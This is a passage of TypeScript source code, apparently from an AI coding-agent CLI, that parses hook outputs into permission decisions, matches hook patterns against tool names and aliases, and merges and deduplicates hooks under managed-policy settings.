    result.hookPermissionDecisionReason = json.reason
  }

  // Handle hookSpecificOutput
  if (json.hookSpecificOutput) {
    // Validate hook event name matches expected if provided
    if (
      expectedHookEvent &&
      json.hookSpecificOutput.hookEventName !== expectedHookEvent
    ) {
      throw new Error(
        `Hook returned incorrect event name: expected '${expectedHookEvent}' but got '${json.hookSpecificOutput.hookEventName}'. Full stdout: ${jsonStringify(json, null, 2)}`,
      )
    }

    switch (json.hookSpecificOutput.hookEventName) {
      case 'PreToolUse':
        // Override with more specific permission decision if provided
        if (json.hookSpecificOutput.permissionDecision) {
          switch (json.hookSpecificOutput.permissionDecision) {
            case 'allow':
              result.permissionBehavior = 'allow'
              break
            case 'deny':
              result.permissionBehavior = 'deny'
              result.blockingError = {
                blockingError:
                  json.hookSpecificOutput.permissionDecisionReason ||
                  json.reason ||
                  'Blocked by hook',
                command,
              }
              break
            case 'ask':
              result.permissionBehavior = 'ask'
              break
            case 'defer':
              result.permissionBehavior = 'defer'
              break
          }
        }
        result.hookPermissionDecisionReason =
          json.hookSpecificOutput.permissionDecisionReason
        // Extract updatedInput if provided
        if (json.hookSpecificOutput.updatedInput) {
          result.updatedInput = json.hookSpecificOutput.updatedInput
        }
        // Extract additionalContext if provided
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'UserPromptSubmit':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        result.sessionTitle = json.hookSpecificOutput.sessionTitle
        result.suppressOriginalPrompt =
          json.hookSpecificOutput.suppressOriginalPrompt
        break
      case 'UserPromptExpansion':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        result.suppressOriginalPrompt =
          json.hookSpecificOutput.suppressOriginalPrompt
        break
      case 'SessionStart':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        result.initialUserMessage = json.hookSpecificOutput.initialUserMessage
        result.sessionTitle = json.hookSpecificOutput.sessionTitle
        result.reloadSkills = json.hookSpecificOutput.reloadSkills
        if (
          'watchPaths' in json.hookSpecificOutput &&
          json.hookSpecificOutput.watchPaths
        ) {
          result.watchPaths = json.hookSpecificOutput.watchPaths
        }
        break
      case 'Setup':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'PreModelSwitch':
        if (json.hookSpecificOutput.permissionDecision) {
          switch (json.hookSpecificOutput.permissionDecision) {
            case 'allow':
              result.permissionBehavior = 'allow'
              break
            case 'deny':
              result.permissionBehavior = 'deny'
              result.blockingError = {
                blockingError:
                  json.hookSpecificOutput.permissionDecisionReason ||
                  json.reason ||
                  'Blocked by hook',
                command,
              }
              break
            case 'ask':
              result.permissionBehavior = 'ask'
              break
          }
        }
        if (json.hookSpecificOutput.permissionDecisionReason !== undefined) {
          result.hookPermissionDecisionReason =
            json.hookSpecificOutput.permissionDecisionReason
        }
        break
      case 'PostModelSwitch':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'SubagentStart':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'PostToolUse':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        if (json.hookSpecificOutput.updatedToolOutput !== undefined) {
          result.updatedToolOutput = json.hookSpecificOutput.updatedToolOutput
        }
        if (json.hookSpecificOutput.updatedMCPToolOutput) {
          result.updatedMCPToolOutput =
            json.hookSpecificOutput.updatedMCPToolOutput
        } else if (json.hookSpecificOutput.updatedMCPToolOutput !== undefined) {
          result.legacyMcpRewriteSuppressed = true
        }
        result.classifierContext = json.hookSpecificOutput.classifierContext
        break
      case 'PostToolUseFailure':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'PostToolBatch':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'Stop':
      case 'SubagentStop':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'PermissionDenied':
        result.retry = json.hookSpecificOutput.retry
        break
      case 'PermissionRequest':
        // Extract the permission request decision
        if (json.hookSpecificOutput.decision) {
          result.permissionRequestResult = json.hookSpecificOutput.decision
          // Also update permissionBehavior for consistency
          result.permissionBehavior =
            json.hookSpecificOutput.decision.behavior === 'allow'
              ? 'allow'
              : 'deny'
          if (
            json.hookSpecificOutput.decision.behavior === 'allow' &&
            json.hookSpecificOutput.decision.updatedInput
          ) {
            result.updatedInput = json.hookSpecificOutput.decision.updatedInput
          }
        }
        break
      case 'Elicitation':
        if (json.hookSpecificOutput.action) {
          result.elicitationResponse = {
            action: json.hookSpecificOutput.action,
            content: json.hookSpecificOutput.content as
              | ElicitationResponse['content']
              | undefined,
          }
          if (json.hookSpecificOutput.action === 'decline') {
            result.blockingError = {
              blockingError: json.reason || 'Elicitation denied by hook',
              command,
            }
          }
        }
        break
      case 'ElicitationResult':
        if (json.hookSpecificOutput.action) {
          result.elicitationResultResponse = {
            action: json.hookSpecificOutput.action,
            content: json.hookSpecificOutput.content as
              | ElicitationResponse['content']
              | undefined,
          }
          if (json.hookSpecificOutput.action === 'decline') {
            result.blockingError = {
              blockingError:
                json.reason || 'Elicitation result blocked by hook',
              command,
            }
          }
        }
        break
      // densable 2.1.222 MessageDisplay — displayContent replaces streaming chunk
      case 'MessageDisplay':
        if (json.hookSpecificOutput.displayContent !== undefined) {
          result.displayContent = json.hookSpecificOutput.displayContent
        }
        break
    }
  }

  if (result.additionalContext !== undefined) {
    result.additionalContext = escapeSystemReminderTags(
      result.additionalContext,
    )
  }
  if (result.blockingError !== undefined) {
    result.blockingError = {
      ...result.blockingError,
      blockingError: escapeSystemReminderTags(
        result.blockingError.blockingError,
      ),
    }
  }
  if (result.systemMessage !== undefined) {
    result.systemMessage = escapeSystemReminderTags(result.systemMessage)
  }

  return {
    ...result,
    message: result.blockingError
      ? createAttachmentMessage({
          type: 'hook_blocking_error',
          hookName,
          toolUseID,
          hookEvent,
          blockingError: result.blockingError,
        })
      : createAttachmentMessage({
          type: 'hook_success',
          hookName,
          toolUseID,
          hookEvent,
          // JSON-output hooks inject context via additionalContext →
          // hook_additional_context, not this field. Empty content suppresses
          // the trivial "X hook success: Success" system-reminder that
          // otherwise pollutes every turn (messages.ts:3577 skips on '').
          content: '',
          stdout,
          stderr,
          exitCode,
          command,
          durationMs,
        }),
  }
}

/**
 * Execute a command-based hook using bash or PowerShell.
 *
 * Shell resolution: hook.shell → 'bash'. PowerShell hooks spawn pwsh
 * with -NoProfile -NonInteractive -Command and skip bash-specific prep
 * (POSIX path conversion, .sh auto-prepend, CLAUDE_CODE_SHELL_PREFIX).
 * See docs/design/ps-shell-selection.md §5.1.
 */

const HOOK_EXACT_LIST_MATCHER_RE = /^[a-zA-Z0-9_|, -]+$/

/** Official GFy list separators when exact-list mode is active. */
const HOOK_EXACT_LIST_SPLIT_RE = /[|, ]+/

/**
 * Check if a match query matches a hook matcher pattern
 * @param matchQuery The query to match (e.g., 'Write', 'Edit', 'Bash')
 * @param matcher The matcher pattern - can be:
 *   - Simple string for exact match (e.g., 'Write')
 *   - Pipe/comma/space-separated list (e.g., 'Write|Edit', 'Write, Edit')
 *   - Regex pattern (e.g., '^Write.*', '.*', '^(Write|Edit)$')
 * @returns true if the query matches the pattern
 */
/** densable u0e — Pre/PostModelSwitch matcher strips trailing [1m]/[2m]. */
function stripModelSwitchMatcherSuffix(
  event: HookEvent,
  matcher: string,
): string {
  if (event !== 'PreModelSwitch' && event !== 'PostModelSwitch') {
    return matcher
  }
  const stripped = matcher.replace(/\[[12]m\](?=\s*(?:[|,]|$))/gi, '')
  return stripped.trim() === '' ? matcher : stripped
}

function matchesPattern(matchQuery: string, matcher: string): boolean {
  if (!matcher || matcher === '*') {
    return true
  }
  // Official 2.1.207: exact-list mode for tool-name matchers (expanded charset).
  // Hyphen is included so `mcp__server__tool-name` and `Edit, Write` stay exact.
  if (HOOK_EXACT_LIST_MATCHER_RE.test(matcher)) {
    const patterns = matcher
      .split(HOOK_EXACT_LIST_SPLIT_RE)
      .map(p => p.trim())
      .filter(Boolean)
      .map(p => normalizeLegacyToolName(p))
    if (patterns.includes(matchQuery)) {
      return true
    }
    return getLegacyToolNames(matchQuery).some(
      alias =>
        patterns.includes(alias) ||
        patterns.includes(normalizeLegacyToolName(alias)),
    )
  }

  // Otherwise treat as regex
  try {
    const regex = new RegExp(matcher)
    if (regex.test(matchQuery)) {
      return true
    }
    // Also test against legacy names so patterns like "^Task$" still match
    for (const legacyName of getLegacyToolNames(matchQuery)) {
      if (regex.test(legacyName)) {
        return true
      }
    }
    return false
  } catch {
    // If the regex is invalid, log error and return false
    logForDebugging(`Invalid regex pattern in hook matcher: ${matcher}`)
    return false
  }
}

/**
 * Official WFy/t2d (2.1.195): warn once when a tool-event matcher is an exact
 * server-only `mcp__server` token (no `__tool`). Exact matchers never match
 * real tools; users need `mcp__server__.*` (regex) for all tools from a server.
 */
const TOOL_HOOK_EVENTS_FOR_MCP_MATCHER_WARN = new Set([
  'PreToolUse',
  'PostToolUse',
  'PostToolUseFailure',
  'PermissionRequest',
  'PermissionDenied',
])

const warnedMcpServerOnlyMatchers = new Set<string>()

function isMcpServerOnlyExactMatcherToken(token: string): boolean {
  return token.startsWith('mcp__') && !token.slice(5).includes('__')
}

function warnIfMcpServerOnlyExactMatcher(
  hookEvent: string,
  matcher: string | undefined,
): void {
  if (!matcher || !TOOL_HOOK_EVENTS_FOR_MCP_MATCHER_WARN.has(hookEvent)) {
    return
  }
  if (warnedMcpServerOnlyMatchers.has(matcher)) return
  if (!HOOK_EXACT_LIST_MATCHER_RE.test(matcher)) return
  const tokens = matcher
    .split(HOOK_EXACT_LIST_SPLIT_RE)
    .map(t => t.trim())
    .filter(Boolean)
  if (!tokens.some(isMcpServerOnlyExactMatcherToken)) return
  warnedMcpServerOnlyMatchers.add(matcher)
  const example = tokens.find(isMcpServerOnlyExactMatcherToken) ?? matcher
  logForDebugging(
    `Hook matcher \`${example}\` matches no tool (it is compared as an exact string). To match all tools from this server, use \`${example}__.*\`. See CHANGELOG v2.1.195.`,
    { level: 'warn' },
  )
}

type IfConditionMatcher = (ifCondition: string) => boolean

/**
 * Official qho / qZt / rG / kBe / MJn / PI (#1386) — Monitor -> Bash PreToolUse
 * hook stand-in helpers.
 */
export function getMonitorCommand(toolInput: unknown): string | undefined {
  return typeof toolInput === 'object' &&
    toolInput !== null &&
    'command' in toolInput &&
    typeof (toolInput as { command?: unknown }).command === 'string' &&
    (toolInput as { command: string }).command !== ''
    ? (toolInput as { command: string }).command
    : undefined
}

export function extractBashLikeInputFromMonitor(
  toolInput: unknown,
): { command: string; description?: string } | undefined {
  const command = getMonitorCommand(toolInput)
  if (command === undefined) return undefined
  if (
    typeof toolInput === 'object' &&
    toolInput !== null &&
    'description' in toolInput &&
    typeof (toolInput as { description?: unknown }).description === 'string'
  ) {
    return {
      command,
      description: (toolInput as { description: string }).description,
    }
  }
  return { command }
}

export function getMonitorBashStandIn(
  toolName: string,
  toolInput: unknown,
): 'Bash' | undefined {
  return toolName === 'Monitor' && getMonitorCommand(toolInput) !== undefined
    ? 'Bash'
    : undefined
}

function getToolInputForHook(hookInput: HookInput): unknown {
  return (hookInput.hook_event_name === 'PreToolUse' ||
    hookInput.hook_event_name === 'PermissionRequest') &&
    'tool_input' in hookInput
    ? hookInput.tool_input
    : undefined
}

export function getHookFamilyNames(
  toolName: string,
  toolInput: unknown,
): string[] {
  const standIn = getMonitorBashStandIn(toolName, toolInput)
  const legacy = getLegacyToolNames(toolName)
  return standIn === undefined ? legacy : [...legacy, standIn]
}

export function remapHookInputForMonitorAsBash(
  hookInput: HookInput,
): HookInput | undefined {
  if (!('tool_name' in hookInput) || !('tool_input' in hookInput)) {
    return undefined
  }
  const mappedName = getMonitorBashStandIn(
    String(hookInput.tool_name),
    getToolInputForHook(hookInput),
  )
  const mappedInput = extractBashLikeInputFromMonitor(hookInput.tool_input)
  if (mappedName === undefined || mappedInput === undefined) {
    return undefined
  }
  return {
    ...hookInput,
    tool_name: mappedName,
    tool_input: mappedInput,
  } as HookInput
}

export function enforceThroughFamilyOnlyHookResult(
  result: HookResult,
  matched: Pick<MatchedHook, 'throughFamilyOnly'> | undefined,
  hookEvent: HookEvent,
  hookLabel: string,
): void {
  if (matched?.throughFamilyOnly !== true) return
  result.classifierContext = undefined
  result.updatedInput = undefined
  if (result.permissionBehavior === 'allow') {
    logForDebugging(
      `Hook ${hookEvent} (${hookLabel}) permissionDecision=allow ignored: it matched this tool only through another of its names, which can deny or ask but not allow`,
    )
    result.permissionBehavior = undefined
  }
  if (result.permissionRequestResult?.behavior === 'allow') {
    logForDebugging(
      `Hook ${hookEvent} (${hookLabel}) PermissionRequest allow ignored: it matched this tool only through another of its names, which can deny or ask but not allow`,
    )
    result.permissionRequestResult = undefined
  }
}

export function remapHookInputForMatchedHook(
  matched: Pick<
    MatchedHook,
    'throughFamilyOnly' | 'matcherMetThroughOtherName'
  >,
  hookInput: HookInput,
): HookInput | undefined {
  const other =
    matched.throughFamilyOnly === true
      ? matched.matcherMetThroughOtherName
      : undefined
  if (other === undefined || !('tool_name' in hookInput)) return undefined
  if (
    other ===
    getMonitorBashStandIn(
      String(hookInput.tool_name),
      getToolInputForHook(hookInput),
    )
  ) {
    return remapHookInputForMonitorAsBash(hookInput)
  }
  return { ...hookInput, tool_name: other } as HookInput
}

/**
 * Prepare a matcher for hook `if` conditions. Expensive work (tool lookup,
 * Zod validation, tree-sitter parsing for Bash) happens once here; the
 * returned closure is called per hook. Returns undefined for non-tool events.
 */
async function prepareIfConditionMatcher(
  hookInput: HookInput,
  tools: Tools | undefined,
): Promise<IfConditionMatcher | undefined> {
  if (
    hookInput.hook_event_name !== 'PreToolUse' &&
    hookInput.hook_event_name !== 'PostToolUse' &&
    hookInput.hook_event_name !== 'PostToolUseFailure' &&
    hookInput.hook_event_name !== 'PermissionRequest' &&
    hookInput.hook_event_name !== 'PermissionDenied'
  ) {
    return undefined
  }

  const toolName = normalizeLegacyToolName(hookInput.tool_name as string)
  const tool = tools && findToolByName(tools, hookInput.tool_name as string)
  const input = tool?.inputSchema.safeParse(hookInput.tool_input)
  const patternMatcher =
    input?.success && tool?.preparePermissionMatcher
      ? await tool.preparePermissionMatcher(input.data)
      : undefined

  const hookToolInput = getToolInputForHook(hookInput)
  const familyNames = getHookFamilyNames(toolName, hookToolInput)
  let bashStandInPatternMatcher: ((ruleContent: string) => boolean) | undefined
  if (getMonitorBashStandIn(toolName, hookToolInput) === 'Bash' && tools) {
    const bashTool = findToolByName(tools, 'Bash')
    const bashLike = extractBashLikeInputFromMonitor(hookInput.tool_input)
    const bashParsed = bashLike
      ? bashTool?.inputSchema.safeParse(bashLike)
      : undefined
    if (bashParsed?.success && bashTool?.preparePermissionMatcher) {
      bashStandInPatternMatcher = await bashTool.preparePermissionMatcher(
        bashParsed.data,
      )
    }
  }

  return ifCondition => {
    const parsed = permissionRuleValueFromString(ifCondition)
    const parsedToolName = normalizeLegacyToolName(parsed.toolName)
    const isDirect = parsedToolName === toolName
    const isFamily = !isDirect && familyNames.includes(parsedToolName)
    if (!isDirect && !isFamily) {
      return false
    }
    if (!parsed.ruleContent) {
      return true
    }
    const activeMatcher =
      isFamily && parsedToolName === 'Bash' && bashStandInPatternMatcher
        ? bashStandInPatternMatcher
        : patternMatcher
    return activeMatcher ? activeMatcher(parsed.ruleContent) : false
  }
}

type FunctionHookMatcher = {
  matcher: string
  hooks: FunctionHook[]
}

/**
 * A hook paired with optional plugin context.
 * Used when returning matched hooks so we can apply plugin env vars at execution time.
 */
type MatchedHook = {
  hook: HookCommand | HookCallback | FunctionHook
  pluginRoot?: string
  pluginId?: string
  skillRoot?: string
  hookSource?: string
  projectRoot?: string
  matcherIsMatchAll?: boolean
  /** densable TVt asOwnTool — plugin matcher hit the remapped own tool. */
  asOwnTool?: boolean
  /** densable TVt asStandIn — matcher also hits the original tool_name. */
  asStandIn?: boolean
  /** Official #1386 — matcher matched via a family/stand-in name (e.g. Monitor -> Bash). */
  matcherMetThroughOtherName?: string
  /** Official #1386 — hook should receive the remapped family stand-in input. */
  throughFamilyOnly?: boolean
}

/**
 * densable TVt — remap hook input tool_name via Jve()?.ownTool.
 * No runner → undefined (no-op). PostToolBatch remaps each tool_calls[].
 */
export function remapHookInputForOwnTool(
  hookInput: HookInput,
): { hookInput: HookInput; tools: Tools } | undefined {
  const ownTool = getPluginHookRunner()?.ownTool
  if (ownTool === undefined) return undefined
  if (hookInput.hook_event_name === 'PostToolBatch') {
    return {
      hookInput: {
        ...hookInput,
        tool_calls: hookInput.tool_calls.map(call => ({
          ...call,
          tool_name: ownTool(call.tool_name)?.name ?? call.tool_name,
        })),
      },
      tools: [],
    }
  }
  if (!('tool_name' in hookInput)) return undefined
  const mapped = ownTool(hookInput.tool_name)
  if (mapped === undefined) return undefined
  return {
    hookInput: {
      ...hookInput,
      tool_name: mapped.name,
      mcp_server: undefined,
    } as unknown as HookInput,
    tools: [mapped],
  }
}

function getHookMatchQuery(hookInput: HookInput): string | undefined {
  switch (hookInput.hook_event_name) {
    case 'PreToolUse':
    case 'PostToolUse':
    case 'PostToolUseFailure':
    case 'PermissionRequest':
    case 'PermissionDenied':
      return hookInput.tool_name as string
    case 'PostToolBatch':
      return undefined
    case 'UserPromptExpansion':
      return hookInput.command_name
    case 'SessionStart':
      return hookInput.source as string
    case 'Setup':
      return hookInput.trigger as string
    case 'PreCompact':
    case 'PostCompact':
      return hookInput.trigger as string
    case 'PreModelSwitch':
    case 'PostModelSwitch':
      return LOe(hookInput.to_model) ? hookInput.to_model : undefined
    case 'Notification':
      return hookInput.notification_type as string
    case 'SessionEnd':
      return hookInput.reason as string
    case 'StopFailure':
      return hookInput.error as string
    case 'SubagentStart':
      return hookInput.agent_type as string
    case 'SubagentStop':
      return hookInput.agent_type as string
    case 'TeammateIdle':
    case 'TaskCreated':
    case 'TaskCompleted':
      return undefined
    case 'Elicitation':
      return hookInput.mcp_server_name as string
    case 'ElicitationResult':
      return hookInput.mcp_server_name as string
    case 'ConfigChange':
      return hookInput.source as string
    case 'InstructionsLoaded':
      return hookInput.load_reason as string
    case 'FileChanged':
      return basename(hookInput.file_path as string)
    case 'DirectoryAdded':
      return (hookInput as { source?: string }).source
    default:
      return undefined
  }
}

function isInternalHook(matched: MatchedHook): boolean {
  return matched.hook.type === 'callback' && matched.hook.internal === true
}

/**
 * Build a dedup key for a matched hook, namespaced by source context.
 *
 * Settings-file hooks (no pluginRoot/skillRoot) share the '' prefix so the
 * same command defined in user/project/local still collapses to one — the
 * original intent of the dedup. Plugin/skill hooks get their root as the
 * prefix, so two plugins sharing an unexpanded `${CLAUDE_PLUGIN_ROOT}/hook.sh`
 * template don't collapse: after expansion they point to different files.
 */
function hookDedupKey(m: MatchedHook, payload: string): string {
  return `${m.pluginRoot ?? m.skillRoot ?? ''}\0${payload}`
}

/**
 * Build a map of {sanitizedPluginName: hookCount} from matched hooks.
 * Only logs actual names for official marketplace plugins; others become 'third-party'.
 */
function getPluginHookCounts(
  hooks: MatchedHook[],
): Record<string, number> | undefined {
  const pluginHooks = hooks.filter(h => h.pluginId)
  if (pluginHooks.length === 0) {
    return undefined
  }
  const counts: Record<string, number> = {}
  for (const h of pluginHooks) {
    const atIndex = h.pluginId!.lastIndexOf('@')
    const isOfficial =
      atIndex > 0 &&
      ALLOWED_OFFICIAL_MARKETPLACE_NAMES.has(h.pluginId!.slice(atIndex + 1))
    const key = isOfficial ? h.pluginId! : 'third-party'
    counts[key] = (counts[key] || 0) + 1
  }
  return counts
}

/**
 * Build a map of {hookType: count} from matched hooks.
 */
function getHookTypeCounts(hooks: MatchedHook[]): Record<string, number> {
  const counts: Record<string, number> = {}
  for (const h of hooks) {
    counts[h.hook.type] = (counts[h.hook.type] || 0) + 1
  }
  return counts
}

function getHooksConfig(
  appState: AppState | undefined,
  sessionId: string,
  hookEvent: HookEvent,
  tiers?: { managedHooksOnly?: boolean; managedHooksExcluded?: boolean },
): Array<
  | HookMatcher
  | HookCallbackMatcher
  | FunctionHookMatcher
  | PluginHookMatcher
  | SkillHookMatcher
  | SessionDerivedHookMatcher
> {
  const policyMatchers =
    getSettingsForSource('policySettings')?.hooks?.[hookEvent] ?? []
  if (tiers?.managedHooksOnly) {
    return shouldDisableAllHooksIncludingManaged() ? [] : policyMatchers
  }
  const policyHooks = new Set(
    policyMatchers.flatMap(matcher =>
      matcher.hooks.map(hook => JSON.stringify([matcher.matcher, hook])),
    ),
  )
  // Settings merging can clone source objects; compare the complete matcher/hook pair.
  const hooks: Array<
    | HookMatcher
    | HookCallbackMatcher
    | FunctionHookMatcher
    | PluginHookMatcher
    | SkillHookMatcher
    | SessionDerivedHookMatcher
  > = shouldDisableAllHooksIncludingManaged()
    ? []
    : (getHooksConfigFromSnapshot()?.[hookEvent] ?? []).map(matcher => ({
        ...matcher,
        hooks: tiers?.managedHooksExcluded
          ? matcher.hooks.filter(
              hook => !policyHooks.has(JSON.stringify([matcher.matcher, hook])),
            )
          : matcher.hooks,
      }))

  // Policy filters configured sources; SDK callbacks remain host-controlled.
  const managedOnly =
    shouldAllowManagedHooksOnly() || shouldDisableAllHooksIncludingManaged()

  // Process registered hooks (SDK callbacks and plugin native hooks)
  const registeredHooks = getRegisteredHooks()?.[hookEvent]
  if (registeredHooks) {
    for (const matcher of registeredHooks) {
      // Skip plugin hooks when restricted to managed hooks only
      // Plugin hooks have pluginRoot set, SDK callbacks do not
      if (managedOnly && 'pluginRoot' in matcher) {
        continue
      }
      hooks.push(matcher)
    }
  }

  // densable fne(): main-thread agent frontmatter hooks (QEt already trust-gated).
  // Only on main session path — subagents register via sessionHooks instead.
  if (!managedOnly) {
    const mainThreadHooks = getMainThreadAgentHooks()?.[hookEvent]
    if (mainThreadHooks) {
      for (const matcher of mainThreadHooks) {
        hooks.push(matcher)
      }
    }
  }

  // Merge session hooks for the current session only
  // Function hooks (like structured output enforcement) must be scoped to their session
  // to prevent hooks from one agent leaking to another (e.g., verification agent to main agent)
  // Skip session hooks entirely when allowManagedHooksOnly is set —
  // this prevents frontmatter hooks from agents/skills from bypassing the policy.
  // strictPluginOnlyCustomization does NOT block here — it gates at the
  // REGISTRATION sites (runAgent.ts:526 for agent frontmatter hooks) where
  // agentDefinition.source is known. A blanket block here would also kill
  // plugin-provided agents' frontmatter hooks, which is too broad.
  // Also skip if appState not provided (for backwards compatibility)
  if (!managedOnly && appState !== undefined) {
    const sessionHooks = getSessionHooks(appState, sessionId, hookEvent).get(
      hookEvent,
    )
    if (sessionHooks) {
      // SessionDerivedHookMatcher already includes optional skillRoot
      for (const matcher of sessionHooks) {
        hooks.push(matcher)
      }
    }

    // Merge session function hooks separately (can't be persisted to HookMatcher format)
    const sessionFunctionHooks = getSessionFunctionHooks(
      appState,
      sessionId,
      hookEvent,
    ).get(hookEvent)
    if (sessionFunctionHooks) {
      for (const matcher of sessionFunctionHooks) {
        hooks.push(matcher)
      }
    }
  }

  return hooks
}

/**
 * Lightweight existence check for hooks on a given event. Mirrors the sources
 * assembled by getHooksConfig() but stops at the first hit without building
 * the full merged config.
 *
 * Intentionally over-approximates: returns true if any matcher exists for the
 * event, even if managed-only filtering or pattern matching would later
 * discard it. A false positive just means we proceed to the full matching
 * path; a false negative would skip a hook, so we err on the side of true.
 *
 * Used to skip createBaseHookInput (getTranscriptPathForSession path joins)
 * and getMatchingHooks on hot paths where hooks are typically unconfigured.
 * See hasInstructionsLoadedHook / hasWorktreeCreateHook for the same pattern.
 */
/**
 * densable s3 — cheap presence check before hot-path createBaseHookInput.
 * Exported for MessageDisplay transform (wth) begin() gate.
 */
export function hasHookForEvent(
  hookEvent: HookEvent,
  appState: AppState | undefined,
  sessionId: string,
): boolean {
  const snap = getHooksConfigFromSnapshot()?.[hookEvent]
  if (snap && snap.length > 0) return true
  const reg = getRegisteredHooks()?.[hookEvent]
  if (reg && reg.length > 0) return true
  // densable fne — main-thread agent hooks
  const mt = getMainThreadAgentHooks()?.[hookEvent]
  if (mt && mt.length > 0) return true
  if (appState?.sessionHooks.get(sessionId)?.hooks[hookEvent]) return true
  if (
    !shouldDisableAllHooksIncludingManaged() &&
    hasMatchingFunctionHook(hookEvent)
  ) {
    return true
  }
  return false
}

/**
 * Get hook commands that match the given query
 * @param appState The current app state (optional for backwards compatibility)
 * @param sessionId The current session ID (main session or agent ID)
 * @param hookEvent The hook event
 * @param hookInput The hook input for matching
 * @returns Array of matched hooks with optional plugin context
 */
export async function getMatchingHooks(
  appState: AppState | undefined,
  sessionId: string,
  hookEvent: HookEvent,
  hookInput: HookInput,
  tools?: Tools,
  tiers?: {
    managedHooksOnly?: boolean
    managedHooksExcluded?: boolean
    suppressTelemetry?: boolean
  },
): Promise<MatchedHook[]> {
  let loadedMatcherCount = 0
  try {
    const hookMatchers = getHooksConfig(appState, sessionId, hookEvent, tiers)
    loadedMatcherCount = hookMatchers.length

    // If you change the criteria below, then you must change
    // src/utils/hooks/hooksConfigManager.ts as well.
    // densable d0e: PostToolBatch has no single matchQuery — undefined
    // so every matcher fires (TKo `n===void 0` → true).
    const matchQuery = getHookMatchQuery(hookInput)
    const remapped = remapHookInputForOwnTool(hookInput)
    const runner = getPluginHookRunner()
    const remappedQuery = remapped
      ? getHookMatchQuery(remapped.hookInput)
      : undefined
    const matcherHits = (
      matcher: { matcher?: string },
      query: string | undefined,
    ): boolean =>
      !matcher.matcher ||
      query === undefined ||
      matchesPattern(
        query,
        stripModelSwitchMatcherSuffix(hookEvent, matcher.matcher),
      )
    const ownToolMatchers = new Set(
      remapped === undefined
        ? []
        : hookMatchers.filter(
            matcher =>
              'pluginId' in matcher &&
              runner?.holds?.((matcher as { pluginId: string }).pluginId) ===
                true &&
              matcherHits(matcher, remappedQuery),
          ),
    )

    logForDebugging(
      `Getting matching hook commands for ${hookEvent} with query: ${matchQuery}`,
      { level: 'verbose' },
    )
    logForDebugging(`Found ${hookMatchers.length} hook matchers in settings`, {
      level: 'verbose',
    })

    // Official 2.1.195: warn once on server-only exact mcp__ matchers for tool events.
    for (const matcher of hookMatchers) {
      warnIfMcpServerOnlyExactMatcher(hookEvent, matcher.matcher)
    }

    // Extract hooks with their plugin context (if any)
    const hookToolInput = getToolInputForHook(hookInput)
    const familyNames =
      matchQuery !== undefined
        ? getHookFamilyNames(matchQuery, hookToolInput)
        : []
    const matchedHooks: MatchedHook[] = hookMatchers.flatMap(matcher => {
      const asOwnTool = ownToolMatchers.has(matcher)
      const directHit = matcherHits(matcher, matchQuery)
      const familyHit =
        !directHit && matchQuery !== undefined
          ? familyNames.find(name => matcherHits(matcher, name))
          : undefined
      if (!asOwnTool && !directHit && familyHit === undefined) {
        return []
      }
      // Check if this is a PluginHookMatcher (has pluginRoot) or SkillHookMatcher (has skillRoot)
      const pluginRoot =
        'pluginRoot' in matcher ? matcher.pluginRoot : undefined
      const pluginId = 'pluginId' in matcher ? matcher.pluginId : undefined
      const skillRoot = 'skillRoot' in matcher ? matcher.skillRoot : undefined
      const hookSource = pluginRoot
        ? 'pluginName' in matcher
          ? `plugin:${matcher.pluginName}`
          : 'plugin'
        : skillRoot
          ? 'skillName' in matcher
            ? `skill:${matcher.skillName}`
            : 'skill'
          : 'settings'
      return matcher.hooks.map(hook => ({
        hook,
        pluginRoot,
        pluginId,
        skillRoot,
        hookSource,
        matcherIsMatchAll:
          !matcher.matcher ||
          matcher.matcher === '*' ||
          matcher.matcher === '.*',
        ...('projectRoot' in matcher &&
        typeof matcher.projectRoot === 'string' &&
        !('pluginRoot' in matcher) &&
        !('skillRoot' in matcher) &&
        !('deviceOwner' in matcher) &&
        !('origin' in matcher)
          ? { projectRoot: matcher.projectRoot }
          : {}),
        ...(asOwnTool && {
          asOwnTool: true,
          asStandIn: directHit,
        }),
        ...(familyHit !== undefined && {
          matcherMetThroughOtherName: familyHit,
          throughFamilyOnly: true,
        }),
      }))
    })

    // Deduplicate hooks by command/prompt/url within the same source context.
    // Key is namespaced by pluginRoot/skillRoot (see hookDedupKey above) so
    // cross-plugin template collisions don't drop hooks (gh-29724).
    //
    // Note: new Map(entries) keeps the LAST entry on key collision, not first.
    // For settings hooks this means the last-merged scope wins; for
    // same-plugin duplicates the pluginRoot is identical so it doesn't matter.
    // Fast-path: callback/function hooks don't need dedup (each is unique).
    // Skip the 6-pass filter + 4×Map + 4×Array.from below when all hooks are
    // callback/function — the common case for internal hooks like
    // sessionFileAccessHooks/attributionHooks (44x faster in microbench).
    if (
      matchedHooks.every(
        m => m.hook.type === 'callback' || m.hook.type === 'function',
      )
    ) {
      return matchedHooks
    }

    // Helper to extract the `if` condition from a hook for dedup keys.
    // Hooks with different `if` conditions are distinct even if otherwise identical.
    const getIfCondition = (hook: { if?: string }): string => hook.if ?? ''

    const uniqueCommandHooks = Array.from(
      new Map(
        matchedHooks
          .filter(
            (
              m,
            ): m is MatchedHook & { hook: HookCommand & { type: 'command' } } =>
              m.hook.type === 'command',
          )
          // shell is part of identity: {command:'echo x', shell:'bash'}
          // and {command:'echo x', shell:'powershell'} are distinct hooks,
          // not duplicates. Default to 'bash' so legacy configs (no shell
          // field) still dedup against explicit shell:'bash'.
          .map(m => [
            hookDedupKey(
              m,
              `${m.hook.shell ?? DEFAULT_HOOK_SHELL}\0${m.hook.command}\0${JSON.stringify(m.hook.args ?? null)}\0${getIfCondition(m.hook)}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniquePromptHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'prompt')
          .map(m => [
            hookDedupKey(
              m,
              `${(m.hook as { prompt: string }).prompt}\0${getIfCondition(m.hook as { if?: string })}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniqueAgentHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'agent')
          .map(m => [
